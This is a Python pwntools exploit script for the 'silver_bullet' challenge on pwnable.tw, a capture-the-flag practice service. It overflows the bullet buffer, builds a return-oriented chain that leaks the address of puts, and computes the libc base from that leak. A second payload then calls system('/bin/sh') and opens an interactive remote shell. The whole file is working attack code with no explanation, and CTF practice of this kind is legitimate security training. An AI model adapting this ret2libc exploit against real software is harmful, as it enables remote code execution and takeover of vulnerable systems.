#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10103
LOCAL = False
challenge = "./silver_bullet"
elf = ELF(challenge, checksec=False)
libc = ELF("./libc_32.so.6", checksec=False)

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            # b *main + 0x35
            # b *main + 0xc5
            # b *beat
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def create(contents):
    ru('choice :')
    sl(str(1))
    ru('bullet :')
    sl(contents)

def powerup(contents):
    ru('choice :')
    sl(str(2))
    ru('bullet :')
    sl(contents)

def beat():
    ru('choice :')
    sl(str(3))

create("A" * 0x2f)
powerup("A")

main = 0x8048954
puts_got = 0x804AFDC
puts_plt = 0x80484A8
payload = b"\xff\xff\xff" + b'A' * 4 + p32(puts_plt) + p32(main) + p32(puts_got) 
powerup(payload)
beat()

ru("!!\n")
leak = u32(r(4))
libc.address = leak - libc.symbols[b"puts"]
print("[COMPUTE] LIBC ADDR: ", hex(libc.address))

create("A" * 0x2f)
powerup("A")
payload = b"\xff\xff\xff" + b'A' * 4 + p32(libc.symbols[b"system"]) + b'A' * 4 + p32(next(libc.search(b"/bin/sh")))
powerup(payload)
beat()

p.interactive()

